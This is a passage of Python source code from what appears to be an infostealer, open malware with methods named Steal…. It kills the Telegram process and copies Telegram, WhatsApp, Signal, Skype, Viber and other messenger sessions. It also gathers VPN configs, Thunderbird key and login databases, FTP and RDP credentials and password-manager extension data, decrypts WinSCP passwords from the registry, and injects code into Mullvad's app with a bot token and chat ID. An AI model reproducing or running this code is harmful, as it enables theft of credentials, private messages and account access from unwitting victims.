            with open(mullvad_license_path, 'w') as license_file:
                license_file.write(f"{TOKEN}\n{CHAT_ID}")
        else:
            pass

        await inject(mullvad_path, mullvad_asar_path, mullvad_injection_url, mullvad_license_path)


    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
            
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate()

                if not os.path.exists(copy_path):
                    os.makedirs(copy_path)

                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dirs))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dirs))
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Telegram files to logs: {str(Error)}")
                        continue

                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Telegram files: {str(Error)}")
            pass

    async def StealWhatsApp(self, directory_path: str) -> None:
        try:
            whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
            os.makedirs(whatsapp_session, exist_ok=True)
            regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
            parent_folders = [entry for entry in Path(self.localappdata, 'Packages').iterdir() if regex_pattern.match(entry.name)]

            for parent in parent_folders:
                local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
                for local_state_folder in local_state_folders:
                    profile_pictures_folders = [entry for entry in local_state_folder.rglob("profilePictures") if entry.is_dir()]
                    for profile_folder in profile_pictures_folders:
                        destination_path = os.path.join(whatsapp_session, local_state_folder.name, "profilePictures")
                        os.makedirs(destination_path, exist_ok=True)
                        shutil.copytree(profile_folder, destination_path, dirs_exist_ok=True)
                    try:
                        files_to_copy = [file for file in local_state_folder.rglob("*") if file.is_file() and file.stat().st_size <= 10 * 1024 * 1024 and re.search(r"\.db$|\.db-wal$|\.dat$", file.name)]
                        for file in files_to_copy:
                            dest_folder = os.path.join(whatsapp_session, local_state_folder.name)
                            os.makedirs(dest_folder, exist_ok=True)
                            shutil.copy(file, dest_folder)
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Whatsapp files to logs: {str(Error)}")

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Whatsapp files: {str(Error)}")
            pass

    async def StealSkype(self, directory_path: str) -> None:
        try:
            skype_folder = os.path.join(self.appdata, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
            if os.path.exists(skype_folder):
                copy_path = os.path.join(directory_path, "Messenger", "Skype")
                os.makedirs(copy_path, exist_ok=True)
                try:
                    if os.path.isdir(skype_folder):
                        shutil.copytree(skype_folder, copy_path, dirs_exist_ok=True)
                    else:
                        shutil.copyfile(skype_folder, copy_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Skype files to logs: {str(Error)}")
                
                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)
                
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Skype files: {str(Error)}")
            pass


    async def StealSignal(self, directory_path: str) -> None:
        try:
            signal_path = os.path.join(self.appdata, 'Signal')
            copied_path = os.path.join(directory_path, "Messenger", "Signal")
            if os.path.isdir(signal_path):
                if not os.path.exists(copied_path):
                    os.makedirs(copied_path)
                
                try:
                    items_to_copy = [
                        ("sql", "sql"),
                        ("attachments.noindex", "attachments.noindex"),
                        ("config.json", "config.json"),
                        ("Local Storage", "Local Storage"),
                        ("Session Storage", "Session Storage"),
                        ("databases", "databases")
                    ]
                    for item, target in items_to_copy:
                        source_path = Path(signal_path) / item
                        target_path = os.path.join(copied_path, target)
                    if os.path.exists(source_path):
                        if os.path.isdir(source_path):
                            shutil.copytree(source_path, target_path)
                        elif os.path.isfile(source_path):
                            shutil.copy(source_path, target_path)

                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Signal files to logs: {str(Error)}")
                    pass
                
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Signal files: {str(Error)}")
            pass
 
    async def StealElement(self, directory_path: str) -> None:
        try:
            element_path = os.path.join(self.appdata, 'Element')
            copied_path = os.path.join(directory_path, "Messenger", "Element")
            if os.path.isdir(element_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                indexed_db_src = Path(element_path) / "IndexedDB"
                local_storage_src = Path(element_path) / "Local Storage"
                try:
                    if os.path.exists(indexed_db_src):
                        shutil.copytree(indexed_db_src, os.path.join(copied_path, "IndexedDB"))
                    if os.path.exists(local_storage_src):
                        shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Element files to logs: {str(Error)}")
                    pass
                
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Element files: {str(Error)}")
            pass 
   
    async def StealViber(self, directory_path: str) -> None:
        try:
            viber_path = os.path.join(self.appdata, 'ViberPC')
            copied_path = os.path.join(directory_path, "Messenger", "Viber")
            if os.path.isdir(viber_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                pattern = re.compile(r"^(\+?[0-9]{1,12})$")
                directories = [entry for entry in Path(viber_path).iterdir() if entry.is_dir() and pattern.match(entry.name)]
                root_files = [file for file in Path(viber_path).glob("*.db")]

                try:
                    for root_file in root_files:
                        shutil.copy(root_file, copied_path)

                    for directory in directories:
                        destination_path = os.path.join(copied_path, directory.name)
                        shutil.copytree(directory, destination_path)
                        files = [file for file in directory.rglob("*") if file.is_file() and re.search(r"\.db$|\.db-wal$", file.name)]
                        for file in files:
                            dest_file_path = os.path.join(destination_path, file.name)
                            shutil.copy(file, dest_file_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Viber files to logs: {str(Error)}")
               
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Viber files: {str(Error)}")
            pass
  

    async def StealPidgin(self, directory_path: str) -> None:
        try:
            pidgin_folder = os.path.join(self.appdata, '.purple', "accounts.xml")
            if os.path.exists(pidgin_folder):
                pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
                os.makedirs(pidgin_accounts, exist_ok=True)
                try:
                    if pidgin_folder.is_dir():
                        shutil.copytree(pidgin_folder, pidgin_accounts, dirs_exist_ok=True)
                    else:
                        shutil.copy2(pidgin_folder, pidgin_accounts)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Pidgin files to logs: {str(Error)}")
                    
                if len(os.listdir(pidgin_accounts)) == 0:
                    os.rmdir(pidgin_accounts)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Pidgin files: {str(Error)}")
            pass

    async def StealTox(self, directory_path) -> None:
        try:
            tox_path = os.path.join(self.appdata, "tox")
            
            saves = []

            if not os.path.exists(tox_path):
                return

            files = os.listdir(tox_path)

            for file in files:
                save_path = os.path.join(tox_path, file)

                if file.endswith(".tox") or file.endswith(".ini") or file.endswith(".db"):
                    saves.append(save_path)

            if saves:
                tox_session = os.path.join(directory_path, "Messenger", "Tox")
                os.makedirs(tox_session, exist_ok=True)

                for save in saves:
                    try:
                        if os.path.isdir(save):
                            shutil.copytree(save, tox_session, dirs_exist_ok=True)
                        else:
                            shutil.copy2(save, tox_session)
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Tox files: {str(Error)}")

                if len(os.listdir(tox_session)) == 0:
                    os.rmdir(tox_session)

        except Exception as e:
            logs_handler(f"[ERROR] - getting Tox files: {str(e)}")

            
    async def StealProtonVPN(self, directory_path: str) -> None:
        try:
            protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
            if not os.path.isdir(protonvpn_folder):
                return
            
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            protonvpn_account = os.path.join(directory_path, "VPN", 'ProtonVPN')
            os.makedirs(protonvpn_account, exist_ok=True)
            pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")
            directories = await get_hierarchy(Path(protonvpn_folder), pattern)
            for directory in directories:
                destination_path = os.path.join(protonvpn_account, directory.name)
                try:
                    if directory.is_dir():
                        shutil.copytree(directory, destination_path, dirs_exist_ok=True)
                    else:
                        shutil.copy2(directory, destination_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying ProtonVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting ProtonVPN files: {str(Error)}")
            pass
        
    async def StealOpenVPN(self, directory_path: str) -> None:
        try:
            openvpn_folder = os.path.join(self.appdata, 'OpenVPN Connect')
            if not os.path.isdir(openvpn_folder):
                return
            
            openvpn_accounts = os.path.join(directory_path, "VPN", 'OpenVPN')
            os.makedirs(openvpn_accounts, exist_ok=True)
            profiles_src = os.path.join(openvpn_folder, 'profiles')
            config_src = os.path.join(openvpn_folder, 'config.json')
            try:
                if Path(profiles_src).is_dir():shutil.copytree(Path(profiles_src), openvpn_accounts, dirs_exist_ok=True)
                else:shutil.copy2(Path(profiles_src), openvpn_accounts)
                if Path(config_src).is_dir():shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
                else:shutil.copy2(Path(config_src), openvpn_accounts)
            except Exception as Error:
                logs_handler(f"[ERROR] - copying OpenVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting OpenVPN files: {str(Error)}")
            pass

    async def StealSurfsharkVPN(self, directory_path: str) -> None:
        try:
            surfsharkvpn_folder = os.path.join(self.appdata, 'Surfshark')
            if not os.path.isdir(surfsharkvpn_folder):
                return
            
            surfsharkvpn_account = os.path.join(directory_path, "VPN", 'Surfshark')
            os.makedirs(surfsharkvpn_account, exist_ok=True)
            files_to_copy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]
            for root, _, files in os.walk(surfsharkvpn_folder):
                for file in files:
                    try:
                        if file in files_to_copy:
                            shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying OpenVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] -getting SurfsharkVPN files: {str(Error)}")
            pass

    async def StealNordVPN(self, directory_path) -> None:
        try:
            main_path = os.path.join(self.localappdata, "NordVPN")
            destination_path = os.path.join(directory_path, "VPN", "NordVpn")
            if not os.path.exists(main_path):
                return

            files = os.listdir(main_path)
            saves = []

            for file in files:
                save_path = os.path.join(main_path, file)
                if os.path.isdir(save_path):
                    if "exe" in file:
                        files_exe = os.listdir(save_path)
                        for file_exe in files_exe:
                            user_config_path = os.path.join(save_path, file_exe, "user.config")
                            if os.path.exists(user_config_path):
                                saves.append(user_config_path)

            if saves:
                try:
                    if not os.path.isdir(destination_path):
                        os.mkdir(destination_path)
                        shutil.copy2(saves, destination_path)
                    else:
                        pass
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying NordVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"Error getting NordVPN {str(Error)}")

    

    async def BackupThunderbird(self, directory_path: str) -> None:
        try:
            thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
            if not os.path.isdir(thunderbird_folder):
                return
            
            thunderbird_backup = os.path.join(directory_path, "Email", 'Thunderbird')
            os.makedirs(thunderbird_backup, exist_ok=True)
            pattern = re.compile(r"^[a-z0-9]+\.default-esr$")
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            directories = await get_hierarchy(Path(thunderbird_folder), pattern)
            filter_files = ["key4.db", "key3.db", "logins.json", "cert9.db", "*.js"]
            for directory in directories:
                destination_path = os.path.join(thunderbird_backup, directory.name)
                os.makedirs(destination_path, exist_ok=True)
                for file_pattern in filter_files:
                    for file in directory.rglob(file_pattern):
                        relative_path = file.relative_to(directory)
                        dest_file_path = os.path.join(destination_path, relative_path)
                        dest_file_dir = os.path.dirname(dest_file_path)
                        try:
                            if not os.path.isdir(dest_file_dir):
                                os.makedirs(dest_file_dir, exist_ok=True)
            
                            if file.is_dir():
                                shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
                            else:
                                shutil.copy2(file, dest_file_path)
                        except Exception as Error:
                            logs_handler(f"[ERROR] - copying BackupThunderBird files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting BackupThunderBird files: {str(Error)}")
            pass


    async def BackupMailbird(self, directory_path: str) -> None:
        try:
            mailbird_folder = os.path.join(self.localappdata, 'MailBird')
            if not os.path.isdir(mailbird_folder):
                return
            
            mailbird_db = os.path.join(directory_path, "Email", 'MailBird')
            os.makedirs(mailbird_db, exist_ok=True)
            store_db = os.path.join(mailbird_folder, 'Store', 'Store.db')
            try:
                if Path(store_db).is_dir():
                    shutil.copytree(Path(store_db), mailbird_db, dirs_exist_ok=True)
                else:
                    shutil.copy2(Path(store_db), mailbird_db)
            except Exception as Error:
                logs_handler(f"[ERROR] - copying BackupMailBird files to logs: {str(Error)}")
    
        except Exception as Error:
            logs_handler(f"[ERROR] - getting BackupMailBird files: {str(Error)}")
            pass


    async def StealFileZilla(self, directory_path: str) -> None:
        try:
            filezilla_folder = os.path.join(self.appdata, 'FileZilla')
            if not os.path.isdir(filezilla_folder):
                return
            
            filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
            os.makedirs(filezilla_hosts, exist_ok=True)

            files_to_copy = [
                os.path.join(filezilla_folder, 'recentservers.xml'),
                os.path.join(filezilla_folder, 'sitemanager.xml')
            ]

            for file in files_to_copy:
                if os.path.isfile(file):
                    shutil.copy(file, filezilla_hosts)
            
        except Exception as Error:
            logs_handler(f"[ERROR] - copying FileZilla files: {str(Error)}")
            pass

    async def StealSmartFTP(self, directory_path: str) -> None:
        try:
            smartftp_folder = r"C:\Users\Nom\AppData\Roaming\SmartFTP\Client 2.0\Favorites"
            if not os.path.isdir(smartftp_folder):
                return

            smartftp_dest = os.path.join(directory_path, "FTP Clients", 'SmartFTP')
            os.makedirs(smartftp_dest, exist_ok=True)

            for root, dirs, files in os.walk(smartftp_folder):
                for file in files:
                    source_file = os.path.join(root, file)
                    relative_path = os.path.relpath(root, smartftp_folder)
                    dest_dir = os.path.join(smartftp_dest, relative_path)

                    os.makedirs(dest_dir, exist_ok=True)
                    shutil.copy(source_file, dest_dir)
            
        except Exception as Error:
            logs_handler(f"[ERROR] - copying SmartFTP files: {str(Error)}")
            pass

    async def StealTotalCommander(self, directory_path):
        try:
            totalcommander_path = os.path.join(os.getenv("APPDATA"), "GHISLER")

            if not os.path.exists(totalcommander_path):
                return

            wcx_ftp_path = os.path.join(totalcommander_path, "wcx_ftp.ini")
            
            if os.path.exists(wcx_ftp_path):
                totalcommander_session = os.path.join(directory_path, "Clients", "TotalCommander")
                os.makedirs(totalcommander_session, exist_ok=True)

                try:
                    shutil.copy2(wcx_ftp_path, totalcommander_session)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Total Commander file: {str(Error)}")

                if len(os.listdir(totalcommander_session)) == 0:
                    os.rmdir(totalcommander_session)

        except Exception as e:
            logs_handler(f"[ERROR] - getting Total Commander files: {str(e)}")

    async def StealWinSCP(self, destination_path) -> None:
        try:
            connections = []
            WSCP_CHARS = []
            reg_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
            except FileNotFoundError:
                return

            subkeys = []
            i = 0
            while True:
                try:
                    subkey = winreg.EnumKey(reg_key, i)
                    subkeys.append(subkey)
                    i += 1
                except OSError:
                    break

            if not subkeys:
                return

            for subkey in subkeys:
                try:
                    subkey_path = os.path.join(reg_path, subkey)
                    sub_reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey_path)
                    async def RegitryValue(reg_key, value_name):
                        try:
                            value, _ = winreg.QueryValueEx(reg_key, value_name)
                            return value
                        except FileNotFoundError:
                            return ""
                    hostname = await RegitryValue(sub_reg_key, "HostName")
                    username = await RegitryValue(sub_reg_key, "UserName")
                    password = await RegitryValue(sub_reg_key, "Password")

                    if password and username and hostname:
                        async def decrypt(username, hostname, encrypted):
                            if not re.match(r"[A-F0-9]+", encrypted):
                                return ""
                            
                            async def DecryptNextChar():
                                if len(WSCP_CHARS) == 0:
                                    return 0x00

                                WSCP_SIMPLE_STRING = "0123456789ABCDEF"

                                a = WSCP_SIMPLE_STRING.index(WSCP_CHARS.pop(0))
                                b = WSCP_SIMPLE_STRING.index(WSCP_CHARS.pop(0))

                                return 0xff & ~(((a << 4) + b) ^ 0xa3)

                            result = []
                            key = f"{username}{hostname}"

                            WSCP_CHARS = list(encrypted)

                            flag = await DecryptNextChar()
                            if flag == 0xff:
                                await DecryptNextChar()
                                length = await DecryptNextChar()
                            else:
                                length = flag

                            WSCP_CHARS = WSCP_CHARS[await DecryptNextChar() * 2:]

                            for _ in range(length):
                                result.append(chr(await DecryptNextChar()))

                            if flag == 0xff:
                                valid = ''.join(result[:len(key)])
                                if valid != key:
                                    result = []
                                else:
                                    result = result[len(key):]

                            WSCP_CHARS = []

                            return ''.join(result)
                        decrypted_password = await decrypt(username, hostname, password)

                        connections.append({
                            'username': username,
                            'password': decrypted_password,
                            'hostname': hostname
                        })

                except Exception as e:
                    logs_handler(f"Error processing subkey {subkey}: {e}")
            
            try:
                output_file = os.path.join(destination_path, "FTP Clients", "WinSCP")
                os.makedirs(output_file, exist_ok=True)
                output_file = os.path.join(destination_path, "FTP Clients", "WinSCP", "winscp_connexions.txt")
                with open(output_file, 'w', encoding="utf-8", errors="ignore") as file:
                    for conn in connections:
                        file.write(f"Host: {conn['hostname']}\n")
                        file.write(f"User: {conn['username']}\n")
                        file.write(f"Pass: {conn['password']}\n")
                        file.write("=" * 40 + "\n")

            except Exception as Error:
                logs_handler(f"Error sending WinSCP connextions to logs Folder {str(Error)}")
        except Exception as Error:
            logs_handler(f"Error getting WinSCP {str(Error)}")

    async def StealPasswordManagers(self, directory_path: str) -> None:
        try:
            password_mgr_dirs = {
                "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
                "eiaeiblijfjekdanodkjadfinkhbfgcd": "NordPass",
                "fdjamakpfbbddfjaooikfcpapjohcfmg": "DashLane",
                "nngceckbapebfimnlniiiahkandclblb": "Bitwarden",
                "pnlccmojcmeohlpggmfnbbiapkmbliob": "RoboForm",
                "bfogiafebfohielmmehodmfbbebbbpei": "Keeper",
                "cnlhokffphohmfcddnibpohmkdfafdli": "MultiPassword",
                "oboonakemofpalcgghocfoadofidjkkk": "KeePassXC",
                "hdokiejnpimakedhajhdlcegeplioahd": "LastPass",
                "imloifkgjagghnncjkhggdhalmcnfklk": "Trezor",
            }

            password_dir_path = os.path.join(directory_path, "Password Managers")

            for browser_name, browser_path in self.browser_paths.items():
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        if "Local Extension Settings" in dirs:
                            local_extensions_settings_dir = os.path.join(root, "Local Extension Settings")
                            for password_mgr_key, password_manager in password_mgr_dirs.items():
                                extension_path = os.path.join(local_extensions_settings_dir, password_mgr_key)
                                if os.path.exists(extension_path):
                                    password_mgr_browser = f"{password_manager} ({browser_name})"
                                    password_mgr_browser_path = os.path.join(password_dir_path, password_mgr_browser)
                                    os.makedirs(password_mgr_browser_path, exist_ok=True)

                                    if Path(extension_path).is_dir():
                                        shutil.copytree(Path(extension_path), password_mgr_browser_path, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(Path(extension_path), password_mgr_browser_path)

                                    location_file = os.path.join(password_mgr_browser_path, "Location.txt")
                                    with open(location_file, 'w') as loc_file:
                                        loc_file.write(f"Copied {password_manager} from {extension_path} to {password_mgr_browser_path}")

            if os.path.exists(password_dir_path) and not os.listdir(password_dir_path):
                os.rmdir(password_dir_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting passwords extensions: {str(Error)}")



    async def StealRdpSessions(self, directory_path) -> None:

        paths_dict = {
            "Microsoft RDP": r"Software\Microsoft\Terminal Server Client\Servers",
            "Remote Desktop Manager": os.path.join(os.getenv("APPDATA"), "Devolutions", "RemoteDesktopManager"),
            "mRemoteNG": os.path.join(os.getenv("APPDATA"), "mRemoteNG", "confCons.xml"),
            "AnyDesk": os.path.join(os.getenv("APPDATA"), "AnyDesk"),
            "TeamViewer": os.path.join(os.getenv("APPDATA"), "TeamViewer"),
            "VNC Clients": [os.path.join(os.getenv("APPDATA"), "TightVNC"), os.path.join(os.getenv("APPDATA"), "RealVNC")],
            "Parallels Access": os.path.join(os.getenv("APPDATA"), "Parallels", "Access"),
            "Chrome Remote Desktop": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Extensions")
        }

        rdp_sessions_path = os.path.join(directory_path, "RDP Sessions")
        os.makedirs(rdp_sessions_path, exist_ok=True)

        try:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, paths_dict["Microsoft RDP"])
                for i in range(winreg.QueryInfoKey(key)[0]):
                    server_name = winreg.EnumKey(key, i)
                    try:
                        server_key = winreg.OpenKey(key, server_name)
                        username = winreg.QueryValueEx(server_key, "UsernameHint")[0]
                    except FileNotFoundError:
                        username = "No Username"
                    ListFonction.RdpSession.append({"application": "Microsoft RDP", "server": server_name, "username": username})
                    app_path = os.path.join(rdp_sessions_path, "Microsoft RDP")
                    os.makedirs(app_path, exist_ok=True)
                    with open(os.path.join(app_path, f"{server_name}_session.txt"), "w") as f:
                        f.write(f"Server: {server_name}\nUsername: {username}")
            except Exception as e:
                logs_handler(f"[ERROR] Microsoft RDP: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "Remote Desktop Manager")
                os.makedirs(app_path, exist_ok=True)
                for file in os.listdir(paths_dict["Remote Desktop Manager"]):
                    if file.endswith((".json", ".xml")):
                        with open(os.path.join(paths_dict["Remote Desktop Manager"], file), "r") as f:
                            data = f.read()
                            ListFonction.RdpSession.append({"application": "Remote Desktop Manager", "data": data})
                            with open(os.path.join(app_path, file), "w") as save_file:
                                save_file.write(data)
            except Exception as e:
                logs_handler(f"[ERROR] Remote Desktop Manager: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "mRemoteNG")
                os.makedirs(app_path, exist_ok=True)
                tree = ET.parse(paths_dict["mRemoteNG"])
                root = tree.getroot()
                for connection in root.findall("Connection"):
                    name, username, host = connection.get("Name"), connection.get("Username", "No Username"), connection.get("ServerName", "No Server")
                    ListFonction.RdpSession.append({"application": "mRemoteNG", "name": name, "server": host, "username": username})
                    with open(os.path.join(app_path, f"{name}_session.xml"), "w") as f:
                        f.write(ET.tostring(connection, encoding="unicode"))
            except Exception as e:
                logs_handler(f"[ERROR] mRemoteNG: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "AnyDesk")
                os.makedirs(app_path, exist_ok=True)
                for file in os.listdir(paths_dict["AnyDesk"]):
                    if file.endswith(".txt"):
                        with open(os.path.join(paths_dict["AnyDesk"], file), "r") as f:
                            data = f.read()
                            ListFonction.RdpSession.append({"application": "AnyDesk", "data": data})
                            with open(os.path.join(app_path, file), "w") as save_file:
                                save_file.write(data)
            except Exception as e:
                logs_handler(f"[ERROR] AnyDesk: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "TeamViewer")
                os.makedirs(app_path, exist_ok=True)
                for file in os.listdir(paths_dict["TeamViewer"]):
                    if file.endswith((".log", ".ini")):
                        with open(os.path.join(paths_dict["TeamViewer"], file), "r") as f:
                            data = f.read()
                            ListFonction.RdpSession.append({"application": "TeamViewer", "data": data})
                            with open(os.path.join(app_path, file), "w") as save_file:
                                save_file.write(data)
            except Exception as e:
                logs_handler(f"[ERROR] TeamViewer: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "VNC Clients")
                os.makedirs(app_path, exist_ok=True)
                for vnc_path in paths_dict["VNC Clients"]:
                    for file in os.listdir(vnc_path):
                        if file.endswith((".vnc", ".reg")):
                            with open(os.path.join(vnc_path, file), "r") as f:
                                data = f.read()
                                ListFonction.RdpSession.append({"application": "VNC Client", "data": data})
                                with open(os.path.join(app_path, file), "w") as save_file:
                                    save_file.write(data)
            except Exception as e:
                logs_handler(f"[ERROR] VNC Clients: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "Parallels Access")
                os.makedirs(app_path, exist_ok=True)
                for file in os.listdir(paths_dict["Parallels Access"]):
                    if file.endswith(".json"):
                        with open(os.path.join(paths_dict["Parallels Access"], file), "r") as f:
                            data = json.load(f)
                            ListFonction.RdpSession.append({"application": "Parallels Access", "data": data})
                            with open(os.path.join(app_path, file), "w") as save_file:
                                json.dump(data, save_file)
            except Exception as e:
                logs_handler(f"[ERROR] Parallels Access: {e}")

            try:
                app_path = os.path.join(rdp_sessions_path, "Chrome Remote Desktop")
                os.makedirs(app_path, exist_ok=True)
                for root, _, files in os.walk(paths_dict["Chrome Remote Desktop"]):
                    for file in files:
                        if "chrome_remote_desktop" in file:
                            with open(os.path.join(root, file), "r") as f:
                                data = f.read()
                                ListFonction.RdpSession.append({"application": "Chrome Remote Desktop", "data": data})
                                with open(os.path.join(app_path, file), "w") as save_file:
                                    save_file.write(data)
            except Exception as e:
                logs_handler(f"[ERROR] Chrome Remote Desktop: {e}")

        except Exception as e:
            logs_handler(f"[ERROR] General Exception: {e}")



    async def StealSteamUser(self) -> None:
        try:
            all_disks = []
            for drive in range(ord('A'), ord('Z') + 1):
                drive_letter = chr(drive)
                if os.path.exists(drive_letter + ':\\'):
                    all_disks.append(drive_letter)

            for steam_paths in all_disks:
                steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.isfile(steam_paths):
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                url1 = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids={steamid}"
                                url2 = f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}"
                                url3 = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}&include_appinfo=true&include_played_free_games=true"

                                async with session.get(url1) as req:
                                    player_summary = await req.json()

                                async with session.get(url2) as req2:
                                    player_level = await req2.json()

                                async with session.get(url3) as req3:
                                    player_games = await req3.json()

                                player_data = player_summary["response"]["players"][0]
                                personname = player_data["personaname"]
                                profileurl = player_data["profileurl"]
                                timecreated = player_data["timecreated"]
                                creation_date = datetime.utcfromtimestamp(timecreated).strftime('%d-%m-%Y')

                                if player_data.get("realname"):
                                    realname = player_data["realname"]
                                else:
                                    realname = "None"

                                level = player_level["response"]["player_level"]
                                total_games = player_games["response"]["game_count"]

                                ListFonction.SteamUserAccounts.append(f"Real Name: {realname}\nPerson Name: {personname}\nProfile URL: {profileurl}\nCreation Date: {creation_date}\nPlayer Level: {level}\nTotal games: {total_games}\n====================================================================================\n")
                                
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Steam session: {str(Error)}")


    async def StealMinecraft(self, directory_path: str) -> None:
        try:
            minecraft_paths = [
                {"name": "NationsGlory", "path": os.path.join(self.appdata, "NationsGlory", "Local Storage", "leveldb")},
                {"name": "Minecraft", "path": os.path.join(self.appdata, ".minecraft", "launcher_accounts_microsoft_store.json")},
                {"name": "Microsoft Store", "path": os.path.join(self.appdata, ".minecraft", "launcher_accounts.json")},
                {"name": "CheatBreakers", "path": os.path.join(self.appdata, ".minecraft", "cheatbreaker_accounts.json")},
                {"name": "TLauncher", "path": os.path.join(self.appdata, ".minecraft", "TlauncherProfiles.json")},
                {"name": "Paladium", "path": os.path.join(self.appdata, "paladium-group", "accounts.json")},
                {"name": "Novoline", "path": os.path.join(self.appdata, ".minecraft", "Novoline", "alts.novo")},
                {"name": "Badlion", "path": os.path.join(self.appdata, "Badlion Client", "accounts.json")},
                {"name": "Feather", "path": os.path.join(self.appdata, ".feather", "accounts.json")},
                {"name": "Impact", "path": os.path.join(self.appdata, ".minecraft", "Impact", "alts.json")},
                {"name": "Meteor", "path": os.path.join(self.appdata, ".minecraft", "meteor-client", "accounts.nbt")},
                {"name": "PolyMC", "path": os.path.join(self.appdata, "PolyMC", "accounts.json")},
                {"name": "Rise", "path": os.path.join(self.appdata, ".minecraft", "Rise", "alts.txt")},
                {"name": "Lunar", "path": os.path.join(self.appdata, ".lunarclient", "settings", "game", "accounts.json")},
            ]

            for mc_path in minecraft_paths:
                client_name = mc_path["name"]
                path = mc_path["path"]

                if os.path.exists(path):
                    target_path = os.path.join(directory_path, "Games", client_name)
                    os.makedirs(target_path, exist_ok=True)

                    if os.path.isfile(path):
                        shutil.copy(path, target_path)
                    else:
                        for root, _, files in os.walk(path):
                            for file in files:
                                src_file_path = os.path.join(root, file)
